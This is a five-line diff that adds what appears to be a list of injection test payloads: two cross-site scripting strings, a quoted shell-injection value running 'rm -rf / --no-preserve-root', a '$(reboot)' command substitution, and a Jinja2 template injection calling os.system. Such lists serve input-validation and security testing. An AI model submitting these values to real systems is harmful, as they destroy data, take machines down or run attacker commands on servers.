@@ -1,0 +1,5 @@
+<svg onload=alert(1)>
+<script>alert('Hacked!');</script>
+" || rm -rf / --no-preserve-root ||
+$(reboot)
+{% set evil = cycler.__init__.__globals__.os.system('id') %}
